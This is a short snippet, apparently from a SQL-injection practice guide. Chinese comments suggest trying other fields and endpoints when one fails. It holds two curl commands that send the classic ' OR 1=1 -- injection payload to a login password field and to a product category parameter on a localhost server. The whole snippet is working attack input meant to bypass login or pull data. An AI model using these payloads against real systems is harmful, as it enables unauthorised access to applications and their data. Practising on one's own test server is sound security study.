# 不一定每个字段都能注。换个字段试试：
curl -X POST ... -d '{"username": "admin", "password": "'\'' OR 1=1 --"}'

# 或者换个接口试试：
curl "http://localhost:5000/api/products?category=' OR 1=1 --"
